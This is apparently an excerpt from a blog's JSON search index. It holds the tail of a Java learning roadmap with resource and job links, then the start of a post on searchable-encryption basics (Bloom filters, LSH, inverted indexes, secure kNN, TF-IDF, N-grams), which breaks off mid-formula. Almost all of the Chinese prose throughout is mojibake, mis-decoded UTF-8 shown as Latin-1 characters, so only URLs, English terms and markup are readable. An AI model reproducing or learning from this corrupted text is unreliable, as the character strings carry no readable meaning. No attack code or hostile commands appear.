æå®¢æ—¶é—´ã€Šæ¶ˆæ¯é˜Ÿåˆ—é«˜æ‰‹è¯¾ã€‹\n- æå®¢æ—¶é—´ã€ŠRPC å®æˆ˜ä¸æ ¸å¿ƒåŸç†ã€‹\n- ã€Šä» paxos åˆ° zookeeperã€‹\n- ã€ŠNetty in Actionã€‹\n- [MIT6.824 (gitbook.io)](https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/)\n\n## Javaè¿›é˜¶\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n- JVMâ˜‘ï¸\n- JUCâ˜‘ï¸\n\n- è®¾è®¡æ¨¡å¼ğŸ“Œ\n\n\n> **å­¦ä¹ èµ„æº**\n\n- JVM\n  - [å°šç¡…è°·å®‹çº¢åº· - JVMå…¨å¥—æ•™ç¨‹è¯¦è§£](https://www.bilibili.com/video/BV1PJ411n7xZ)\n  - [ç‹‚ç¥è¯´Java JVMå¿«é€Ÿå…¥é—¨ç¯‡](https://www.bilibili.com/video/BV1iJ411d7jS)\n  - [é˜¿é‡Œäº‘ JVM å®æˆ˜](https://developer.aliyun.com/graph/java/point/64)\n  - [Java è™šæ‹Ÿæœºåº•å±‚åŸç†çŸ¥è¯†æ€»ç»“](https://github.com/doocs/jvm)\n  - ã€Šæ·±å…¥ç†è§£ Java è™šæ‹Ÿæœºã€‹\n- JUC\n  - [å°šç¡…è°·-å¤§å‚å¿…å¤‡æŠ€æœ¯ä¹‹JUCå¹¶å‘ç¼–ç¨‹](https://www.bilibili.com/video/BV1Kw411Z7dF)\n  - ã€ŠJava å¹¶å‘ç¼–ç¨‹è‰ºæœ¯ã€‹\n  - ã€ŠJava å¹¶å‘ç¼–ç¨‹ä¹‹ç¾ã€‹\n- è®¾è®¡æ¨¡å¼\n  - ã€Šå›¾è§£è®¾è®¡æ¨¡å¼ã€‹\n  - ã€Šè®¾è®¡æ¨¡å¼çš„è‰ºæœ¯ã€‹\n\n## CSåŸºç¡€\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n- è®¡ç®—æœºç½‘ç»œğŸ”„\n- æ“ä½œç³»ç»ŸğŸ”„\n- è®¡ç®—æœºç»„æˆåŸç†ğŸ”„\n- æ•°æ®ç»“æ„ä¸ç®—æ³•ğŸ“Œ\n\n\n> **å­¦ä¹ èµ„æº**\n\n- ã€Šå›¾è§£ HTTPã€‹\n- ã€Šå›¾è§£ TCP/IPã€‹\n- [Javaæ•°æ®ç»“æ„ä¸ç®—æ³•](https://www.bilibili.com/video/BV1E4411H73v)\n- [ä»£ç éšæƒ³å½•](https://programmercarl.com/)\n\n## å·¥å…·\n\n> **å¿…çŸ¥å¿…ä¼š**\n\n- Mavenâœ…\n- Gitâœ…\n- Dockerâœ…\n- Junitâœ…\n- Lombokâœ…\n- Jmeterâœ…\n- K8Sâ˜‘ï¸\n- Swagger â˜‘ï¸\n- Postman â˜‘ï¸\n\n> **å­¦ä¹ èµ„æº**\n\n- [è…¾è®¯äº‘åŠ¨æ‰‹å®éªŒå®¤](https://cloud.tencent.com/developer/search/lab-Docker)\n- [Docker ä»å…¥é—¨åˆ°å®è·µ]( https://vuepress.mirror.docker-practice.com/)\n\n## ç»ƒæ‰‹é¡¹ç›®\n\n- ç”µå•†ç³»ç»Ÿï¼š[mall](https://github.com/macrozheng/mall)\n\n- ç§’æ€ç³»ç»Ÿï¼š[miaosha](https://github.com/qiurunze123/miaosha)\n- [å°šç¡…è°·_è°·ç²’å­¦è‹‘](https://www.bilibili.com/video/BV1dQ4y1A75e)\n\n## æ±‚èŒç›¸å…³\n\n### å…«è‚¡æ–‡\n\n- [JavaGuide](https://javaguide.cn/)\n- [Java å…¨æ ˆçŸ¥è¯†ä½“ç³»](https://pdai.tech/)\n- [Java ç¨‹åºå‘˜è¿›é˜¶ä¹‹è·¯](https://tobebetterjavaer.com/)\n- [CS-Wiki](https://cswiki.top/)\n- [ç¨‹åºå‘˜å¤§å½¬ (topjavaer.cn)](http://topjavaer.cn/)\n- [Javaåç«¯é¢è¯•é¢˜å¤§å…¨](https://www.developers.pub/wiki/1002310)\n- [javapub.net.cn](http://javapub.net.cn/)\n\n### æ±‚èŒå¿…è¯»\n\n- [äº’è”ç½‘æ ¡æ‹›æŒ‡åŒ— ](https://mp.weixin.qq.com/s/Olg_RjmSm1UCuRwwqEJa8g)\n- [ä¸ºäº†è§£å¼€äº’è”ç½‘å¤§å‚ç§‹æ‹›å†…å¹•ï¼Œæˆ‘æŠŠä»–ä»¬å…¨é¢äº†ä¸€é](https://mp.weixin.qq.com/s/pBsGQNxvRupZeWt4qZReIA)\n- [Overseas Rabbit | æµ·å¤–å…” (osjobs.net)](https://osjobs.net/)\n\n### å²—ä½æŠ•é€’\n\n- é˜¿é‡Œï¼šhttps://talent.alibaba.com/\n- è…¾è®¯ï¼šhttps://join.qq.com/index.html\n- ç¾å›¢ï¼šhttps://campus.meituan.com/\n- åä¸ºï¼šhttps://career.huawei.com/\n- äº¬ä¸œï¼šhttps://campus.jd.com/home#/\n- ç™¾åº¦ï¼šhttps://talent.baidu.com/external/baidu/\n- æ»´æ»´ï¼šhttps://talent.didiglobal.com/\n- ç½‘æ˜“ï¼šhttps://campus.163.com/app/index\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["è·¯çº¿"],"categories":["JavaSE"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†","url":"/posts/1428.html","content":"\n### 1.å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ(LSH)\n\n**Locality Sensitive Hashing**ï¼š`ä¸»è¦ç”¨äºé«˜æ•ˆå¤„ç†æµ·é‡é«˜ç»´æ•°æ®çš„æœ€è¿‘é‚»é—®é¢˜` ï¼Œä½¿å¾— 2 ä¸ªç›¸ä¼¼åº¦å¾ˆé«˜çš„æ•°æ®ä»¥è¾ƒé«˜çš„æ¦‚ç‡æ˜ å°„æˆåŒä¸€ä¸ªhash å€¼ï¼Œè€Œä»¤ 2 ä¸ªç›¸ä¼¼åº¦å¾ˆä½çš„æ•°æ®ä»¥æä½çš„æ¦‚ç‡æ˜ å°„æˆåŒä¸€ä¸ª hash å€¼ã€‚\n\nLSHè¯¦ç»†å†…å®¹è¯·çœ‹ï¼š[LSHåŸç†ä¸å®ç°](https://blog.csdn.net/guoziqing506/article/details/53019049)ã€[LSH(å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ)](http://staff.ustc.edu.cn/~huding/data_pdf/LSH.pdf)ã€[æ·±å…¥æµ…å‡ºLSH](http://www.cppblog.com/humanchao/archive/2018/02/24/215521.html)\n\n[Locality Sensitive Hashing (LSH) Home Page (mit.edu)](https://www.mit.edu/~andoni/LSH/)\n\n[ä¸€æ–‡äº†è§£å±€éƒ¨æ•æ„Ÿå“ˆå¸Œï¼ˆLSHï¼‰çš„å‰ä¸–ä»Šç”Ÿ](https://blog.csdn.net/m0_37710845/article/details/106725631)\n\n### 2.å¸ƒéš†è¿‡æ»¤å™¨(BF)\n\n**Bloom filter**ï¼š`ä¸»è¦ç”¨äºæ£€ç´¢ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨ä¸€ä¸ªé›†åˆä¸­`ï¼Œ1970å¹´ç”±å¸ƒéš†æå‡ºï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªå¾ˆé•¿çš„äºŒè¿›åˆ¶å‘é‡(ä½å›¾)å’Œä¸€ç³»åˆ—éšæœºæ˜ å°„å‡½æ•°ï¼ˆå“ˆå¸Œå‡½æ•°ï¼‰ã€‚å­˜å‚¨çš„æ•°æ®æ˜¯ 0 æˆ– 1 ï¼Œé»˜è®¤æ˜¯0ï¼Œ0ä»£è¡¨`ä¸å­˜åœ¨`æŸä¸ªæ•°æ®ï¼Œ1ä»£è¡¨`å­˜åœ¨`æŸä¸ªæ•°æ®ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/640)\n\n##### å­˜å…¥è¿‡ç¨‹\n\nå¸ƒéš†è¿‡æ»¤å™¨ä¸Šé¢è¯´äº†ï¼Œå°±æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ•°æ®çš„é›†åˆã€‚å½“ä¸€ä¸ªæ•°æ®åŠ å…¥è¿™ä¸ªé›†åˆæ—¶ï¼Œç»å†å¦‚ä¸‹æ´—ç¤¼ï¼š\n\n- é€šè¿‡ K ä¸ªå“ˆå¸Œå‡½æ•°è®¡ç®—è¯¥æ•°æ®ï¼Œè¿”å› K ä¸ªè®¡ç®—å‡ºçš„ hash å€¼\n- è¿™ K ä¸ª hash å€¼æ˜ å°„åˆ°å¯¹åº”çš„ K ä¸ªäºŒè¿›åˆ¶çš„æ•°ç»„ä¸‹æ ‡\n- å°† K ä¸ªä¸‹æ ‡å¯¹åº”çš„äºŒè¿›åˆ¶æ•°æ®æ”¹æˆ 1 ã€‚\n\nä¾‹å¦‚ï¼Œå°†â€œä½ å¥½â€å­˜å…¥å¸ƒéš†è¿‡æ»¤å™¨ï¼Œç¬¬ä¸€ä¸ªå“ˆå¸Œå‡½æ•°è¿”å› 3ï¼Œç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå“ˆå¸Œå‡½æ•°è¿”å› 5 ä¸ 7 ï¼Œé‚£ä¹ˆå¸ƒéš†è¿‡æ»¤å™¨å¯¹åº”çš„ä¸‹æ ‡3ï¼Œ5ï¼Œ7çš„ä½ç½®æ”¹æˆ1ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/640-20220125184517663)\n\n##### æŸ¥è¯¢è¿‡ç¨‹\n\nå¸ƒéš†è¿‡æ»¤å™¨ä¸»è¦ä½œç”¨å°±æ˜¯æŸ¥è¯¢ä¸€ä¸ªæ•°æ®ï¼Œåœ¨ä¸åœ¨è¿™ä¸ªäºŒè¿›åˆ¶çš„é›†åˆä¸­ï¼ŒæŸ¥è¯¢è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- é€šè¿‡ K ä¸ªå“ˆå¸Œå‡½æ•°è®¡ç®—è¯¥æ•°æ®ï¼Œå¯¹åº”è®¡ç®—å‡ºçš„ K ä¸ª hash å€¼\n- é€šè¿‡ hash å€¼æ‰¾åˆ°å¯¹åº”çš„äºŒè¿›åˆ¶çš„æ•°ç»„ä¸‹æ ‡\n- åˆ¤æ–­ï¼šå¦‚æœå­˜åœ¨ä¸€å¤„ä½ç½®çš„äºŒè¿›åˆ¶æ•°æ®æ˜¯ 0ï¼Œé‚£ä¹ˆè¯¥æ•°æ®ä¸å­˜åœ¨ã€‚å¦‚æœéƒ½æ˜¯1ï¼Œè¯¥æ•°æ®å­˜åœ¨é›†åˆä¸­ã€‚\n\næˆ‘ä»¬å‡è®¾ BF æ˜¯ä¸€ä¸ª 12bit çš„äºŒè¿›åˆ¶å‘é‡ï¼Œ{h1,h2}æ˜¯ä¸¤ä¸ªå“ˆå¸Œå‡½æ•°ï¼Œ{x,y,z}æ˜¯ä¸€ä¸ªé›†åˆã€‚ ç”¨æˆ·æƒ³æŸ¥è¯¢å…³é”®å­— w,æŸ¥è¯¢ç»“æœæ˜¾ç¤º w åœ¨é›†åˆä¸­ä¸å­˜åœ¨ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/image-20220126235419137.png)\n\n##### ä¼˜ç¼ºç‚¹\n\nå®ƒçš„ä¼˜ç‚¹æ˜¯ç©ºé—´æ•ˆç‡å’ŒæŸ¥è¯¢æ—¶é—´éƒ½è¿œè¿œè¶…è¿‡ä¸€èˆ¬çš„ç®—æ³•ï¼Œç¼ºç‚¹æ˜¯æœ‰ä¸€å®šçš„**è¯¯è¯†åˆ«ç‡**å’Œ**åˆ é™¤å›°éš¾**ã€‚\n\næ·»åŠ æ•°æ®æ˜¯é€šè¿‡è®¡ç®—æ•°æ®çš„ hash å€¼ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å­˜åœ¨è¿™ç§æƒ…å†µï¼šä¸¤ä¸ªä¸åŒçš„æ•°æ®è®¡ç®—å¾—åˆ°ç›¸åŒçš„ hashå€¼ã€‚è¿™æ ·æŸ¥è¯¢çš„æ—¶å€™å°±ä¼šé€ æˆé”™è¯¯è¯†åˆ«ï¼ŒåŒæ ·å¦‚æœå·²ç»å­˜åœ¨æœ‰ä¸¤ä¸ªç›¸åŒ hash å€¼çš„æ•°æ®ï¼Œåˆ é™¤æ—¶å°±ä¼šåŒæ—¶åˆ é™¤ä¸¤ä¸ªã€‚\n\nBFè¯¦ç»†å†…å®¹è¯·çœ‹ï¼š[æœ€ç‰›ä¸€ç¯‡å¸ƒéš†è¿‡æ»¤å™¨è¯¦è§£](https://mp.weixin.qq.com/s/1AbsMXNvTcZ_baKES8K4Kg)\n\n##### Bloom filter å‡é˜³æ€§\n\n- Bloom filter å­˜åœ¨å‡é˜³æ€§ï¼ˆfalse positiveï¼‰çš„å¯èƒ½\n  - å‡é˜³æ€§è¡¨ç¤ºå®é™…æ˜¯å‡ä½†è¯¯è¾¨ä¸ºçœŸçš„æƒ…å†µ\n\n- Bloom filter ä¸å­˜åœ¨å‡é˜´æ€§ï¼ˆfalse negativesï¼‰çš„å¯èƒ½\n  - å‡é˜´æ€§è¡¨ç¤ºå®é™…æ˜¯çœŸä½†è¯¯è¾¨ä¸ºå‡çš„æƒ…å†µ\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ¬¡æŸ¥è¯¢è¿”å›çš„ç»“æœæ˜¯**å¯èƒ½åœ¨é›†åˆé‡Œ**æˆ–è€…**ç»å¯¹ä¸åœ¨é›†åˆé‡Œ**ã€‚\n\n------\n\n### 3.å¯¹å¶ç¼–ç å‡½æ•°\n\nç»™å®šå­—ç¬¦ä¸² S<sub>1</sub> = C<sub>1</sub>C<sub>2</sub> â€¦ C<sub>n</sub> å’ŒäºŒè¿›åˆ¶å‘é‡ S<sub>2</sub> = b<sub>0</sub>b<sub>1</sub> â€¦ b<sub>m-1</sub> , S<sub>2</sub> ä¸­æ¯ä½å…ƒç´ çš„åˆå§‹å€¼ä¸º 0ï¼Œå…¶ä¸­ n < m .é€šè¿‡ Hash å‡½æ•° Hï¼ŒæŠŠ S<sub>1</sub> ä¸­ç›¸é‚» 2 ä¸ªå­—ç¬¦æ•£åˆ—æ˜ å°„ä¸º 0ï½(m -1) ä¹‹é—´çš„æ•°ï¼Œå½“ä¸”ä»…å½“ H ( C<sub>j</sub> , C<sub>j +1</sub> ) = i æ—¶ï¼Œb<sub>i</sub> = 1ã€‚æŠŠ S<sub>1</sub> â†’ S<sub>2</sub> çš„å‡½æ•°ç§°ä¸ºå¯¹å¶ç¼–ç å‡½æ•°ã€‚\n\nåœ¨é¢å‘å¯†æ–‡çš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢æ–¹æ¡ˆä¸­ï¼Œæ„å»ºç´¢å¼•ã€æ„å»ºé™·é—¨å’Œå…³é”®å­—æŸ¥è¯¢çš„è¿‡ç¨‹éƒ½æ˜¯åŸºäºå‘é‡çš„æ“ä½œè¿‡ç¨‹ã€‚æ•°æ®æ‹¥æœ‰è€…è¾“å…¥çš„å…³é”®å­—éƒ½ç”±å­—ç¬¦ç»„æˆï¼Œç”±äºå­—ç¬¦çš„ä¸å¯è®¡ç®—æ€§ï¼Œéœ€è¦å°†å…¶è½¬æ¢æˆå‘é‡çš„å½¢å¼ã€‚\n\n------\n\n### 4.å€’æ’ç´¢å¼•\n\n**æ­£æ’ç´¢å¼•(forward index)**\n\næ­£æ’ç´¢å¼•æ˜¯æŒ‡ä»¥æ–‡æ¡£ ID ä¸º Keyï¼Œæ–‡æ¡£å†…å®¹ä¸º Value\n\n**å€’æ’ç´¢å¼•(inverted index)**\n\nå€’æ’ç´¢å¼•æ˜¯æŒ‡ä»¥æ–‡æ¡£å†…å®¹ä¸º Keyï¼Œæ–‡æ¡£ ID ä¸º Value\n\n**ä¸¾ä¸ªä¾‹å­ğŸŒ°**\n\nä¾‹å¦‚ï¼Œæœ‰ 3 ä¸ªæ–‡æ¡£åŠå…¶å¯¹åº”å…³é”®è¯\n\n| ID   | æ–‡æ¡£     | å…³é”®è¯     |\n| ---- | :------- | ---------- |\n| id1  | ã€Šæ‰‹æœºã€‹ | è‹¹æœã€å°ç±³ |\n| id2  | ã€Šæ°´æœã€‹ | é¦™è•‰ã€è‹¹æœ |\n| id3  | ã€Šç²®é£Ÿã€‹ | å°ç±³ã€ç‰ç±³ |\n\næ­£æ’ç´¢å¼•ï¼š\n\n**{id1ï¼Œè‹¹æœï¼Œå°ç±³}ã€{id2ï¼Œé¦™è•‰ï¼Œè‹¹æœ}ã€{id3ï¼Œå°ç±³ï¼Œç‰ç±³}**\n\nå€’æ’ç´¢å¼•ï¼š\n\n**{è‹¹æœï¼Œid1ï¼Œid2}ã€{å°ç±³ï¼Œid1ï¼Œid3}ã€{é¦™è•‰ï¼Œid2}ã€{ç‰ç±³ï¼Œid3}**\n\n**ä¸¤ç§ç´¢å¼•ä¼˜ç¼ºç‚¹**\n\n| ç´¢å¼•     | ä¼˜ç‚¹             | ç¼ºç‚¹                   |\n| -------- | ---------------- | ---------------------- |\n| æ­£æ’ç´¢å¼• | æ˜“ç»´æŠ¤ã€æ„å»ºæ–¹ä¾¿ | æœç´¢è€—æ—¶é•¿             |\n| å€’æ’ç´¢å¼• | æœç´¢è€—æ—¶çŸ­       | æ„å»ºè€—æ—¶ã€ç»´æŠ¤æˆæœ¬è¾ƒé«˜ |\n\n### 5.å®‰å…¨æœ€è¿‘é‚»ç®—æ³•(kNN)\n\nKNN(k-nearest neighbour)ï¼šå°±æ˜¯ K ä¸ªæœ€è¿‘çš„é‚»å±…çš„æ„æ€ï¼Œè¯´çš„æ˜¯æ¯ä¸ªæ ·æœ¬éƒ½å¯ä»¥ç”¨å®ƒæœ€æ¥è¿‘çš„ K ä¸ªé‚»è¿‘å€¼æ¥ä»£è¡¨\n\nå®‰å…¨Kæœ€è¿‘é‚»è®¡ç®—æ˜¯ Wong ç­‰äººåœ¨2009å¹´è®ºæ–‡ [Secure kNN computation on encrypted databases ](https://dl.acm.org/doi/pdf/10.1145/1559845.1559862?casa_token=SaRwoUNONpYAAAAA:yyggGhme_SdB5ChSC72vL3JT18SFp8NYfkOCsZJHIIR4eaRWLjTA-tgXMYrqKwLFIPheBAkRvHKV)æå‡ºçš„ï¼Œç”¨äºè®¡ç®—ä¸¤ä¸ªåŠ å¯†æ•°æ®åº“è®°å½•ä¹‹é—´çš„è·ç¦»ã€‚åœ¨ä¸€ä¸ªå®‰å…¨çš„ KNN è®¡ç®—ä¸­ï¼Œæ‰€æœ‰çš„æ•°æ®åº“è®°å½•éƒ½è¢«æ‰©å±•åˆ° m ç»´çš„å‘é‡ï¼Œå¹¶ç”± mä½çš„å‘é‡ S å’Œä¸¤ä¸ª m Ã— m å¯é€†çŸ©é˜µ M1 å’Œ M2 åŠ å¯†ã€‚\n\n**ä¸¾ä¸ªğŸŒ°**\n\nä¸‹å›¾ä¸­ï¼Œç»¿è‰²åœ†è¦è¢«å†³å®šèµ‹äºˆå“ªä¸ªç±»ï¼Œæ˜¯çº¢è‰²ä¸‰è§’å½¢è¿˜æ˜¯è“è‰²å››æ–¹å½¢ï¼Ÿ\nKNNçš„ç®—æ³•è¿‡ç¨‹æ˜¯æ˜¯è¿™æ ·çš„ï¼š\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/webp-4501084.)\n\n- æœ€å°çš„åœˆK=3ï¼Œç¬¬äºŒä¸ªåœˆK=5\n- å¦‚æœK=3ï¼Œé‚£ä¹ˆç¦»ç»¿è‰²ç‚¹æœ€è¿‘çš„æœ‰2ä¸ªçº¢è‰²ä¸‰è§’å½¢å’Œ1ä¸ªè“è‰²çš„æ­£æ–¹å½¢ï¼Œè¿™3ä¸ªç‚¹æŠ•ç¥¨ï¼Œäºæ˜¯ç»¿è‰²çš„è¿™ä¸ªå¾…åˆ†ç±»ç‚¹å±äºçº¢è‰²çš„ä¸‰è§’å½¢ã€‚\n- å¦‚æœK=5ï¼Œé‚£ä¹ˆç¦»ç»¿è‰²ç‚¹æœ€è¿‘çš„æœ‰2ä¸ªçº¢è‰²ä¸‰è§’å½¢å’Œ3ä¸ªè“è‰²çš„æ­£æ–¹å½¢ï¼Œè¿™5ä¸ªç‚¹æŠ•ç¥¨ï¼Œäºæ˜¯ç»¿è‰²çš„è¿™ä¸ªå¾…åˆ†ç±»ç‚¹å±äºè“è‰²çš„æ­£æ–¹å½¢ã€‚\n\n------\n\n### 6.è¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦(TF-IDF)\n\nè¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦ï¼ˆTerm Frequency - Inverse Document Frequencyï¼‰æ˜¯ä¸€ç§ç”¨äº**ä¿¡æ¯æ£€ç´¢**ä¸**æ–‡æœ¬æŒ–æ˜**çš„å¸¸ç”¨**åŠ æƒæŠ€æœ¯**ï¼Œç”¨æ¥**è¯„ä¼°ä¸€ä¸ªè¯å¯¹äºä¸€ä¸ªæ–‡æ¡£é›†æˆ–è¯­æ–™åº“ä¸­æŸä¸ªæ–‡æ¡£çš„é‡è¦ç¨‹åº¦**ï¼Œä¸»è¦ç”¨åœ¨**è‡ªåŠ¨æå–å…³é”®è¯ç®—æ³•**ä¸­ã€‚\n\n##### **è¯é¢‘ (TF)**\n\næŒ‡çš„æ˜¯æŸä¸€ä¸ªç»™å®šçš„è¯è¯­åœ¨è¯¥æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/webp)\n\n##### é€†æ–‡æ¡£é¢‘ç‡(IDF)\n\n> ä»¥ç»Ÿè®¡ä¸€ç¯‡æ–‡æ¡£çš„å…³é”®è¯ä¸ºä¾‹ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯è®¡ç®—æ¯ä¸ªè¯çš„è¯é¢‘ï¼Œå‡ºç°é¢‘ç‡æœ€é«˜çš„è¯å°±æ˜¯è¿™ç¯‡æ–‡æ¡£çš„å…³é”®è¯ï¼Œä½†æ˜¯ä¸€ç¯‡æ–‡ç« ä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„è¯è‚¯å®šæ˜¯â€œçš„â€ã€â€œæ˜¯â€ã€â€œåœ¨â€â€¦â€¦è¿™æ ·çš„è¯ï¼Œè¿™äº›è¯æ˜¾ç„¶ä¸èƒ½ååº”æ–‡ç« çš„æ„æ€ï¼Œæ­¤æ—¶å°±éœ€è¦å¯¹æ¯ä¸ªè¯åŠ ä¸€ä¸ªæƒé‡ï¼Œæœ€å¸¸è§çš„è¯ï¼ˆ\"çš„\"ã€\"æ˜¯\"ã€\"åœ¨\"ï¼‰ç»™äºˆæœ€å°çš„æƒé‡ï¼Œè¾ƒå°‘è§çš„ä½†èƒ½ååº”è¿™ç¯‡æ–‡ç« æ„æ€çš„è¯ç»™äºˆè¾ƒå¤§çš„æƒé‡ï¼Œè¿™ä¸ªæƒé‡å«åš**é€†æ–‡æ¡£é¢‘ç‡**ã€‚\n\nIDF æ˜¯ä¸€ä¸ªè¯è¯­æ™®éé‡è¦æ€§çš„åº¦é‡ã€‚å¦‚æœä¸€ä¸ªè¯è¶Šå¸¸è§ï¼Œé‚£ä¹ˆåˆ†æ¯å°±è¶Šå¤§ï¼Œé€†æ–‡æ¡£é¢‘ç‡å°±è¶Šå°è¶Šæ¥è¿‘0ã€‚åˆ†æ¯ä¹‹æ‰€ä»¥è¦åŠ 1ï¼Œæ˜¯ä¸ºäº†é¿å…åˆ†æ¯ä¸º0ï¼ˆå³æ‰€æœ‰æ–‡æ¡£éƒ½ä¸åŒ…å«è¯¥è¯ï¼‰ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/webp-20220126224442893)\n\n##### TF-IDF\n\nçŸ¥é“äº† TF å’Œ IDF ä»¥åï¼Œå°†è¿™ä¸¤ä¸ªå€¼ç›¸ä¹˜ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªè¯çš„ TF-IDF å€¼ã€‚æŸä¸ªè¯å¯¹æ–‡ç« çš„é‡è¦æ€§è¶Šé«˜ï¼Œå®ƒçš„ TF-IDF å€¼å°±è¶Šå¤§ã€‚æ‰€ä»¥ï¼Œæ’åœ¨æœ€å‰é¢çš„å‡ ä¸ªè¯ï¼Œå°±æ˜¯è¿™ç¯‡æ–‡ç« çš„å…³é”®è¯ã€‚\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/bg2013031507.png)\n\nå¯ä»¥çœ‹åˆ°ï¼ŒTF-IDF ä¸ä¸€ä¸ªè¯åœ¨æ–‡æ¡£ä¸­çš„å‡ºç°æ¬¡æ•°æˆæ­£æ¯”ï¼Œä¸è¯¥è¯åœ¨æ•´ä¸ªè¯­è¨€ä¸­çš„å‡ºç°æ¬¡æ•°æˆåæ¯”ã€‚æ‰€ä»¥ï¼Œè‡ªåŠ¨æå–å…³é”®è¯çš„ç®—æ³•å°±å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯è®¡ç®—å‡ºæ–‡æ¡£çš„æ¯ä¸ªè¯çš„ TF-IDF å€¼ï¼Œç„¶åæŒ‰é™åºæ’åˆ—ï¼Œå–æ’åœ¨æœ€å‰é¢çš„å‡ ä¸ªè¯ã€‚\n\n##### æ€»ç»“\n\nå­—è¯çš„é‡è¦æ€§éšç€å®ƒåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°æˆæ­£æ¯”å¢åŠ  ï¼Œä½†åŒæ—¶ä¼šéšç€å®ƒåœ¨è¯­æ–™åº“ä¸­å‡ºç°çš„é¢‘ç‡æˆåæ¯”ä¸‹é™ ã€‚å¦‚æœæŸä¸ªè¯æ¯”è¾ƒå°‘è§ï¼Œä½†æ˜¯å®ƒåœ¨è¿™ç¯‡æ–‡ç« ä¸­å¤šæ¬¡å‡ºç°ï¼Œé‚£ä¹ˆå®ƒå¾ˆå¯èƒ½å°±åæ˜ äº†è¿™ç¯‡æ–‡ç« çš„ç‰¹æ€§ï¼Œæ­£æ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„å…³é”®è¯ã€‚\n\nTF-IDFè¯¦ç»†å†…å®¹è¯·çœ‹ï¼š[TF-IDFï¼ˆè¯é¢‘-é€†æ–‡æ¡£é¢‘ç‡ï¼‰ä»‹ç»](https://www.jianshu.com/p/b2c4ee414fac)\n\n------\n\n### 7.æ³¢ç‰¹è¯å¹²ç®—æ³•(Porter stem)\n\nä»æ•°æ®é›†ä¸­æå–å‡ºçš„å…³é”®å­—é›†åˆè¿›è¡Œâ€œè¯æ ¹â€ è¿‡æ»¤ï¼Œä¾‹å¦‚â€œwalksâ€ã€â€œwalkingâ€ã€â€œwalkedâ€ç­‰è¿‘ä¼¼çš„å…³é”®å­—ï¼Œè¯æ ¹å‡ä¸ºâ€œwalkâ€ã€‚åç»­çš„æ£€ç´¢æ“ä½œåŸºäºè¯æ ¹è¿›è¡Œï¼Œå¤§å¹…å‡å°‘äº†è®¡ç®—é‡ï¼Œä¸”ç”±äºè¯¥æ“ä½œåªæ˜¯åœ¨ç´¢å¼•ç”Ÿæˆæ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œå¯¹æ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œæ•ˆç‡ä¸ä¼šäº§ç”Ÿè¿‡å¤§çš„å½±å“ã€‚\n\n### 8.åˆ†è¯ç®—æ³•(N-gram)\n\nN-gram æ¨¡å‹æ˜¯ä¸€ç§è¯­è¨€æ¨¡å‹ï¼ˆLanguage Modelï¼ŒLMï¼‰ï¼ŒN-gram çš„åŸºæœ¬æ€æƒ³æ˜¯å°†æ–‡æœ¬é‡Œé¢çš„å†…å®¹æŒ‰ç…§å­—èŠ‚è¿›è¡Œå¤§å°ä¸º N çš„æ»‘åŠ¨çª—å£æ“ä½œï¼Œå½¢æˆäº†é•¿åº¦æ˜¯ N çš„å­—èŠ‚ç‰‡æ®µåºåˆ—ã€‚æ¯ä¸ªå­—èŠ‚ç‰‡æ®µå³ä¸º gram ã€‚\n\n- å½“N=1 æ—¶ç§°ä¸º `uni-gram` \n- å½“N=2 æ—¶ç§°ä¸º `bi-gram` \n  - P(æˆ‘å¸®ä½ ) = 